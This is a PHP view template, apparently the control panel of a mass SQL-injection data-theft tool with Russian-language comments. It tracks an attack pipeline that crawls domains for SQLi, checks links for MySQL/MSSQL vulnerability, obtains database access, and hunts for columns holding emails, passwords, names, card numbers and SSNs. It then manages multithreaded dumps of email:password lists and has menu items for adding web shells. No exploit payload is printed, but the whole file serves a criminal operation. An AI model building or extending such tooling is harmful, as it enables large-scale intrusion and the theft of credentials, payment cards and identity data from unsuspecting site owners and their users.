<!-- START CONTENT -->

<div id="content">
<div class="clear"></div>

<ul class="page-nav fl">

<li class="active"><?=$html->link('STATE',array('action'=>'mailinfo')); ?></li>
<li><?=$html->link('ADD LINKS',array('action'=>'add')); ?></li>
<li><?=$html->link('ADD DOMENS',array('action'=>'add_domens')); ?></li>
<li><?=$html->link('ADD SHELLS',array('action'=>'add_shells')); ?></li>
<li><?=$html->link('SINGLE BREAKING',array('action'=>'add_one')); ?></li>
<li><?=$html->link('SINGLE DUMP',array('action'=>'dumping_all')); ?></li>

</ul>

<div class="clear"></div>

<table class="table">
<thead>
<th colspan="2">STEPS</th><th class="center" width="19%">ACTIVITY</th><th class="center" width="19%">ACTIONS</th>
</thead>

<tbody>
<tr>

<td colspan="2">
DOMAIN CHECK  CHECKED  /  LEFT<br> 
</td>

<td class="center">
<?=$domen01?>/<?=$domen02?><br>

<!--
<?=$domen3?>(<?=$domen4?>/<?=$domen5?>)<br>
<?=$domen6?>(<?=$domen7?>/<?=$domen8?>)<br>
-->

</td>
<td class="center"><?=$html->link('DELL',array('action'=>'shlakk_domen/1'),array('class'=>'btn btn_red','onclick'=>'if(!confirm("ALL LINKS WILL BE DELETED. CONTINUE ?")){return false;}'))?></td>
</tr>

<tr>

<td colspan="2">
 SQLI SPIDER DOMAIN TEST  TOTAL / LEFT<br>
</td>

<td class="center">

<?=$domen3?>/<?=$domen2?><br>
<!--
<?=$domen3?>(<?=$domen4?>/<?=$domen5?>)<br>
<?=$domen6?>(<?=$domen7?>/<?=$domen8?>)<br>
-->
</td>

<td class="center"><?=$html->link('DELL',array('action'=>'shlakk_domen/1'),array('class'=>'btn btn_red','onclick'=>'if(!confirm("ALL LINKS WILL BE DELETED. CONTINUE ?")){return false;}'))?></td>
</tr>

<!-- Block Table -->

<!--
<tr>

<td colspan="2">
 Проверка  потенцильных ссылок из ПУЛА / осталось<br>
</td>

<td class="center">
<?=$domen5?>/<?=$domen4?><br>
</td>
<td class="center"><?=$html->link('удалить все',array('action'=>'shlakk_domen/1'),array('class'=>'btn btn_red','onclick'=>'if(!confirm("Будут удалены все ссылки. Продолжить?")){return false;}'))?></td>
</tr>

<tr>
<td colspan="2">
0-3)Проверка потенцильных форм из ПУЛА / осталось<br>
</td>

<td class="center">
<?=$domen7?>/<?=$domen6?><br>
<!--
<?=$domen3?>(<?=$domen4?>/<?=$domen5?>)<br>
<?=$domen6?>(<?=$domen7?>/<?=$domen8?>)<br>
-->
<!--
</td>
<td class="center"><?=$html->link('удалить все',array('action'=>'shlakk_domen/1'),array('class'=>'btn btn_red','onclick'=>'if(!confirm("Будут удалены все ссылки. Продолжить?")){return false;}'))?></td>
</tr>
-->
<!-- End Block Table -->

<tr><td colspan="4"></td> </tr>

<!--
<tr>
<td colspan="2">1) Проверка ссылок через SQLMAP <span class="red" style='font-size:12px;'>MYSQL</span>/<span style='color:blue;font-size:12px;'>MSSQL</span>/Пройдено<br></td>
<td class="center"><?=$shag1_sql?>/<?=$shag1_sql_2?></td>
<td class="center"><?=$html->link('удалить все',array('action'=>'shlakk/1_sql'),array('class'=>'btn btn_red','onclick'=>'if(!confirm("Будут удалены все ссылки. Продолжить?")){return false;}'))?></td>
</tr>
-->

<tr>
<td colspan="2"> CHECKING LINKS FOR VULNERABILITY <span class="red" style='font-size:12px;'>MYSQL</span>/<span style='color:blue;font-size:12px;'>MSSQL</span><br></td>
<td class="center"><?=$shag1?></td>
<td class="center"><?=$html->link('DELL',array('action'=>'shlakk/1'),array('class'=>'btn btn_red','onclick'=>'if(!confirm("ALL LINKS WILL BE DELETED. CONTINUE ?")){return false;}'))?></td>
</tr>

<tr>
<td colspan="2"> OBTAINING ACCESS TO DATABASE <span class="red" style='font-size:12px;'>MYSQL</span>/<span style='color:blue;font-size:12px;'>MSSQL</span></td>
<td class="center"><?=$shag2?></td>
<td class="center"><?=$html->link('DELL',array('action'=>'shlakk/2'),array('class'=>'btn btn_red','onclick'=>'if(!confirm("ALL LINKS WILL BE DELETED. CONTINUE ?")){return false;}'))?></td>
</tr>

<tr>
<td colspan="2"> SEARCH COLUMNS WITH EMAIL <span class="red" style='font-size:12px;'>MYSQL</span>/<span style='color:blue;font-size:12px;'>MSSQL</span></td>
<td class="center"><?=$shag3?></td>
<td class="center">-</td>
</tr>

<tr>
<td colspan="2"> SEARCH FOR COLUMNS WITH PASSWORDS <span class="red" style='font-size:12px;'>MYSQL</span>/<span style='color:blue;font-size:12px;'>MSSQL</span></td>
<td class="center"><?=$shag4?></td>
<td class="center">-</td>
</tr>

<tr>
<td colspan="2"> SEARCH COLUMNS WITH NAMES <span class="red" style='font-size:12px;'>MYSQL</span>/<span style='color:blue;font-size:12px;'>MSSQL</span></td>
<td class="center"><?=$shag444?></td>
<td class="center">-</td>
</tr>

<tr>
<td colspan="2"> SEARCH COLUMNS WITH CARDS <span class="red" style='font-size:12px;'>MYSQL</span> LEFT / PASSED</td>
<td class="center"><?=$shag400?></td>
<td class="center">-</td>
</tr>

<tr>
<td colspan="2"> SEARCH COLUMNS WITH CARDS <span style='color:blue;font-size:12px;'>MSSQL</span> LEFT / PASSED</td>
<td class="center"><?=$shag4000?></td>
<td class="center">-</td>
</tr>

<tr>
<td colspan="2"> SEARCH COLUMNS WITH SSN <span class="red" style='font-size:12px;'>MYSQL</span> LEFT / PASSED</td>
<td class="center"><?=$shag4005?></td>
<td class="center">-</td>
</tr>

<tr>
<td colspan="2"> SEARCH COLUMNS WITH SSN <span style='color:blue;font-size:12px;'>MSSQL</span> LEFT / PASSED</td>
<td class="center"><?=$shag4006?></td>
<td class="center">-</td>
</tr>

<tr><td colspan="4"></td></tr>
<tr>
<td rowspan="5" class="va-middle"> DOWNLOAD DATABASE</td>

<td>FOUND WITH ADDRESSES</td>
<td class="center"><?=$shag5?></td>
<td class="center">-</td>
</tr>

<tr>
<td>FOUND WITH ADDRESSES AND NAMES</td>
<td class="center"><?=$shag55?></td>
<td class="center">-</td>
</tr>

<tr>
<td>FOUND WITH ADDRESSES AND PASSWORDS</td>
<td class="center"><?=$shag6?></td>
<td class="center">-</td>
</tr>

<tr>
<td>TOTAL DOWNLOAD EMAIL:PASS</td>
<td class="center"><?=$shag7;?></td>
<td class="center">-</td>
</tr>

<tr>
<td>TOTAL DOWNLOAD EMAIL</td>
<td class="center"><?=$shag77;?></td>
<td class="center">-</td>
</tr>

<!-- Full Statistics -->
<!--
<tr>
<td rowspan="2" class="va-middle">5)Статистика (BIG)</td>
<td>Всего бигов  мыло:пасс</td>
<td class="center"><?//=$shag82;?> мыл(уник)</td>
<td class="center"><?//=$html->link('Сбросить',array('action'=>'shlak2/big'),array('class'=>'btn btn_red','onclick'=>'if(!confirm("Будут удалены все ссылки. Продолжить?")){return false;}'))?></td>
</tr>

<tr>
<td>Всего бигов  мыло:hash</td>
<td class="center"><?//=$shag84;?> мыл(уник)</td>
<td class="center">-</td>
</tr>
				
				
				<tr>
					<td rowspan="3" class="va-middle">5)БЕЗ ПАССОВ</td>
					<td>Всего корпов без ПАССОВ</td>
					<td class="center"><?//=$shag87;?> мыл(уник)</td>
					<td class="center"><?//=$html->link('Сбросить',array('action'=>'shlak2/corp_one'),array('class'=>'btn btn_red','onclick'=>'if(!confirm("Будут удалены все ссылки. Продолжить?")){return false;}'))?></td>
				</tr>
				
				<tr>
					<td>Всего средних  без ПАССОВ</td>
					<td class="center"><?//=$shag88;?> мыл(уник)</td>
					<td class="center">-</td>
				</tr>
				
				<tr>
					<td>Всего бигов  без ПАССОВ</td>
					<td class="center"><?//=$shag89;?> мыл(уник)</td>
					<td class="center">-</td>
				</tr>
-->
<!-- End Full Statistics -->

</tbody>
</table>

<? if(count($starts)!==0){ ?>
<br/><br/>

<table class="table">
<thead>
<th colspan="2">PERFORMED FUNCTION</th>
<th class="center" width="50">squle_id</th>
<th class="center" width="50">pid</th>
<th class="center" width="50">potok</th>
<th class="center" width="19%">WORKING HOURS</th>
<th class="center" width="19%">ACTIONS</th>
</thead>
<tbody>

<? foreach ($starts as $work){ ?>

<tr>
<? echo "<FORM ACTION='/posts/mailinfo/' METHOD='POST'>";?>
<td colspan="2"><?=$work['starts']['function']?></td>
<td class="center"><?=$work['starts']['squle_id']?></td>
<td class="center"><?=$work['starts']['pid']?></td>
<td class="center"><?=$work['starts']['potok']?></td>

<td class="center">
<?//=date('H:i:s',($work['starts']['lasttime'] - $work['starts']['time_start']))
echo  $work['starts']['lasttime'] - $work['starts']['time_start'].' second';
?>
</td>
					
					<? 
					echo "<input type='hidden' name='pid' value='".$work['starts']['pid']."'>";
					echo "<input type='hidden' name='squle_id' value='".$work['starts']['squle_id']."'>";
					echo '<td class="center">';
					echo "<input type='submit' name='deletepid' value='delete' class='btn btn_red'>";
					echo "</td>";
					echo "</form>";?>
					
					
				</tr>
				<? } ?>
			</tbody>
		</table>
		<? } ?>
		
		
	<?	
		if(count($starts3)!==0)
		{
		echo '<br><h2 class="center" style="font-size:18px">Multithreaded dump</h2><br>';?>
		
		<table class="table">
			<thead>
				
				<th class="center" width="50">ID</th>
				<th class="center" width="50">PID</th>
				<th class="center" width="50">Domen</th>
				<th class="center" width="50">Filed_ID</th>
				<th class="center" width="50">LASTLIMIT</th>
				<th class="center" width="10%">COUNT:</th>
				<th class="center" width="5">GET</th>
				<th class="center" width="5%">POTOK</th>
				<th class="center" width="5%">DOK</th>
				<th class="center" width="5%">Dump</th>
				<th class="center" width="5%">Type</th>
				<th class="center" width="5%">Actions</th>
				<th class="center" width="5%">Status</th>
			</thead>
			<tbody>
				<? foreach ($starts3 as $work3){ ?>
				<tr>
					<td class="center"><?=$work3['multis']['id']?></td>
					<td class="center"><?=$work3['multis']['pid']?></td>
					<td class="center"><?=$work3['multis']['domen']?></td>
					<td class="center"><?=$work3['multis']['filed_id']?></td>
					<td class="center"><?=$work3['multis']['lastlimit']?></td>
					<td class="center"><?=$work3['multis']['count']?></td>
					<td class="center"><?=$work3['multis']['get']?></td>
					<?
					
					if($work3['multis']['isp']=='slivMulti'){
					
					 $isp = 'М fast';
					}
					
					 if($work3['multis']['isp']=='slivoneMulti'){
						$isp = 'М slow';
					 }
					
					if($work3['multis']['isp']=='slivWithPassConcastMulti' ){
					
						$isp = 'M+P fast';
					}
					
					if($work3['multis']['isp']=='slivWithPassMulti' ){
					
						$isp = 'M+P slow';
					}
					
					
					
					
					?>
					
					
					<td class="center"><?=$work3['multis']['potok']?></td>
					<td class="center"><?=$work3['multis']['dok']?></td>
					<td class="center"><?=$isp;?></td>
					
				
			<? echo "<FORM ACTION='/posts/mailinfo/' METHOD='POST'>";
			echo "<td><select name='st3'>";
			echo "<option value='2'>Finish</option>";
			echo "<option value='3' selected>Restart</option>";
			echo "</select></td>";
			echo "<td><input type='hidden' name='id3' value='".$work3['multis']['id']."'>";
			
			
			echo "<input type='hidden' name='pid' value='".$work3['multis']['pid']."'>";
			echo "<input type='submit' name='update3' value='update'>";
			echo "</td>";
			echo '</FORM>';
			
			$time = time();
			
			if(($time - $work3['multis']['date']) > 120){
			
				$st = 'Hung';
			}elseif($work3['multis']['date']==0){
				$st = 'Norm';
			}else{
				$st = 'Norm';
			}
			
			
			echo "<td class='center'>".$st."</td></tr>";?>

				<? } ?>
			</tbody>
		</table>
		<? } ?>
			
<br/>
|| <a href="/posts/update_all" target='_blank'>Restart all download threads</a> || <a href="/posts/optimize" target='_blank'>Optimize the table </a> ||  <a href="/posts/repaire" target='_blank'>Fix table </a> ||
</br>
		
		<?	
		if(count($starts3_one)!==0)
		{
		echo '<br><h2 class="center" style="font-size:18px">Multithreaded dump single site with selected columns</h2><br>';?>
		
		<table class="table">
			<thead>
				
				<th class="center" width="50">ID</th>
				<th class="center" width="50">PID</th>
				<th class="center" width="50">Domen</th>
				<th class="center" width="50">Filed_ID</th>
				<th class="center" width="50">LASTLIMIT</th>
				<th class="center" width="10%">COUNT:</th>
				<th class="center" width="5">GET</th>
				<th class="center" width="5%">POTOK</th>
				<th class="center" width="5%">SPEED</th>
				<th class="center" width="5%">DOK</th>
				<th class="center" width="5%">Actions</th>
				<th class="center" width="5%">Apply</th>
				<th class="center" width="5%">Status</th>
				
				
			</thead>
			<tbody>
				<? foreach ($starts3_one as $work3){ ?>
				<tr>
					<td class="center"><?=$work3['multis_one']['id']?></td>
					<td class="center"><?=$work3['multis_one']['pid']?></td>
					<td class="center"><?=$work3['multis_one']['domen']?></td>
					<td class="center"><?=$work3['multis_one']['filed_id']?></td>
					<td class="center"><?=$work3['multis_one']['lastlimit']?></td>
					<td class="center"><?=$work3['multis_one']['count']?></td>
					<td class="center"><?=$work3['multis_one']['get']?></td>
					<?
					
					if($work3['multis_one']['isp']=='slivMulti'){
					
					 $isp = 'М fast';
					}
					
					 if($work3['multis_one']['isp']=='slivoneMulti'){
						$isp = 'М slow';
					 }
					
					if($work3['multis_one']['isp']=='slivWithPassConcastMulti' ){
					
						$isp = 'M+P fast';
					}
					
					if($work3['multis_one']['isp']=='slivWithPassMulti' ){
					
						$isp = 'M+P slow';
					}
					
					
					
					
					?>
					
					
					<td class="center"><?=$work3['multis_one']['potok']?></td>
					<?
					if($work3['multis_one']['function']==1 ){
					
						$speed = 'slow';
					}else{
						
						$speed = 'fast';
					}
					?>
					<td class="center"><?=$speed?></td>
					
					<? echo "<FORM ACTION='/posts/mailinfo/' METHOD='POST'>";?>
					
					<td class="center">
					
					
						 <? echo "<input type='text' size='2' name='dok' value='".$work3['multis_one']['dok']."'>"; ?>
					
					
					
					
					</td>
					
					
				
			
		<?	echo "<td><select name='st3_one'>";
			echo "<option value='2'>Finish</option>";
			echo "<option value='3' selected>Restart</option>";
			echo "</select></td>";
			echo "<input type='hidden' name='id3' value='".$work3['multis_one']['id']."'>";
			echo "<td><input type='hidden' name='filed_id' value='".$work3['multis_one']['filed_id']."'>";
			echo "<input type='hidden' name='pid' value='".$work3['multis_one']['pid']."'>";
			echo "<input type='submit' name='update33' value='update'>";
			echo "</td>";
			echo '</FORM>';
			
			$time = time();
			
			if(($time - $work3['multis_one']['date']) > 500){
			
				$st = 'Hung';
			}elseif($work3['multis_one']['date']==0){
				$st = 'Norm';
			}else{
				$st = 'Norm';
			}
			
			
			echo "<td class='center'>".$st."</td></tr>";?>

				<? } ?>
			</tbody>
		</table>
		<? } ?>
		
		
		
	</div>
	<!-- STOP CONTENT -->